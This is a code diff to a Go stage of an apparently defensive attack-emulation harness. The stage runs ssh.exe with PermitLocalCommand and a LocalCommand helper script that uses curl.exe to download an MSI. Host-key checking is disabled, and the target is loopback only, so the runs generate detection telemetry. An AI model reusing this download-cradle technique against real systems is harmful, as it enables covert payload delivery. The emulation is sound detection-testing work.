@@ -18,11 +18,20 @@ expects a credential refusal — exercising the exact flag surface generates
 the same process-creation telemetry as the real chain. The payload fetches
 (curl.exe) are served by the orchestrator's loopback HTTP server; no traffic
 leaves the machine.
+
+Lab finding (2026-09-30, Win11 26200): a LocalCommand value containing
+spaces/quotes makes the Windows OpenSSH client hang indefinitely (Go's
+argv quoting emits embedded \" escapes the client cannot parse). The cradle
+therefore passes a single-token LocalCommand pointing at a helper script
+that performs the MSI fetch — same PermitLocalCommand flag surface, same
+intent, deterministic exit. All ssh/curl child executions are additionally
+bounded by hard timeouts so no client state can hang a stage.
 */
 
 package main
 
 import (
+	"context"
 	"fmt"
 	"net"
 	"os"
@@ -92,25 +101,50 @@ func performTechnique() error {
 	}
 
 	if sshAvailable {
+		// The LocalCommand value must be a SINGLE TOKEN (no spaces, no quotes):
+		// Go's argv quoting emits embedded \" escapes that hang the Windows
+		// OpenSSH client (reproduced on Win11 26200 — lab finding 2026-09-30).
+		// The cradle's intent (LocalCommand fetches the MSI) is preserved by
+		// pointing at a helper script the stage writes first.
 		msiDest := filepath.Join(LOG_DIR, "setup.msi")
-		localCommand := fmt.Sprintf(`curl.exe -o "%s" %s/assets/setup.msi`, msiDest, baseURL)
+		helperPath := filepath.Join(LOG_DIR, "f0ldcmd.cmd")
+		helper := fmt.Sprintf("@echo off\r\ncurl.exe -s -S --max-time 30 -o \"%s\" %s/assets/setup.msi\r\n", msiDest, baseURL)
+		if err := os.WriteFile(helperPath, []byte(helper), 0755); err != nil {
+			return fmt.Errorf("LocalCommand helper write failed: %v", err)
+		}
+		LogFileDropped("f0ldcmd.cmd", helperPath, int64(len(helper)), false)
+
 		sshArgs := []string{
 			"-o", "PermitLocalCommand=yes",
-			"-o", "LocalCommand=" + localCommand,
+			"-o", "LocalCommand=" + helperPath,
 			"-o", "StrictHostKeyChecking=no",
 			"-o", "BatchMode=yes",
 			"-o", "ConnectTimeout=5",
 			"redflick-sandbox@127.0.0.1",
 			"exit",
 		}
-		cmd := exec.Command(filepath.Join(os.Getenv("SystemRoot"), "System32", "OpenSSH", "ssh.exe"), sshArgs...)
+
+		// Hard bound on the whole ssh call — ConnectTimeout only bounds TCP,
+		// and a pathological client state must never hang the stage (the
+		// orchestrator watchdog would otherwise burn 180s here).
+		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+		defer cancel()
+		cmd := exec.CommandContext(ctx, filepath.Join(os.Getenv("SystemRoot"), "System32", "OpenSSH", "ssh.exe"), sshArgs...)
 		out, sshErr := cmd.CombinedOutput()
 		exit := exitCodeOf(sshErr)
+		if ctx.Err() == context.DeadlineExceeded {
+			exit = 102
+		}
 		LogProcessExecution("ssh.exe", fmt.Sprintf("ssh.exe %s", strings.Join(maskArg(sshArgs, "LocalCommand="), " ")), pidOf(cmd), sshErr == nil, exit, strings.TrimSpace(string(out)))
 		// Credential refusal is the expected sandbox outcome — NOT a protection
-		// event (Rule 8). The cradle primitive counts as exercised either way.
-		LogMessage("INFO", TECHNIQUE_ID,
-			fmt.Sprintf("ssh.exe cradle exercised (exit %d) — credential refusal expected in sandbox; flag surface generated", exit))
+		// event (Rule 8). The cradle primitive counts as exercised either way:
+		// the exact flag surface generated its process-creation telemetry.
+		if exit == 102 {
+			LogMessage("WARN", TECHNIQUE_ID, "ssh.exe did not return within 30s and was terminated — cradle telemetry already generated; continuing")
+		} else {
+			LogMessage("INFO", TECHNIQUE_ID,
+				fmt.Sprintf("ssh.exe cradle exercised (exit %d) — credential refusal expected in sandbox; flag surface generated", exit))
+		}
 	} else {
 		LogMessage("INFO", TECHNIQUE_ID, "no listener on 127.0.0.1:22 — ssh.exe cradle primitive skipped with note (loopback SSH absent)")
 	}
@@ -151,12 +185,17 @@ func performTechnique() error {
 
 // curlFetch runs the system curl.exe against the loopback server —
 // using the OS binary (not a Go HTTP client) so the exact process-creation
-// telemetry of the July chain is generated.
+// telemetry of the July chain is generated. --max-time bounds every fetch.
 func curlFetch(url, dest string) error {
-	cmd := exec.Command(filepath.Join(os.Getenv("SystemRoot"), "System32", "curl.exe"),
-		"-s", "-S", "-o", dest, url)
+	ctx, cancel := context.WithTimeout(context.Background(), 45*time.Second)
+	defer cancel()
+	cmd := exec.CommandContext(ctx, filepath.Join(os.Getenv("SystemRoot"), "System32", "curl.exe"),
+		"-s", "-S", "--max-time", "30", "-o", dest, url)
 	out, err := cmd.CombinedOutput()
-	LogProcessExecution("curl.exe", fmt.Sprintf("curl.exe -s -S -o %s %s", dest, url), pidOf(cmd), err == nil, exitCodeOf(err), strings.TrimSpace(string(out)))
+	LogProcessExecution("curl.exe", fmt.Sprintf("curl.exe -s -S --max-time 30 -o %s %s", dest, url), pidOf(cmd), err == nil, exitCodeOf(err), strings.TrimSpace(string(out)))
+	if ctx.Err() == context.DeadlineExceeded {
+		return fmt.Errorf("curl fetch of %s did not return within 45s", dest)
+	}
 	if err != nil {
 		return fmt.Errorf("curl.exe exited %d: %s", exitCodeOf(err), strings.TrimSpace(string(out)))
 	}
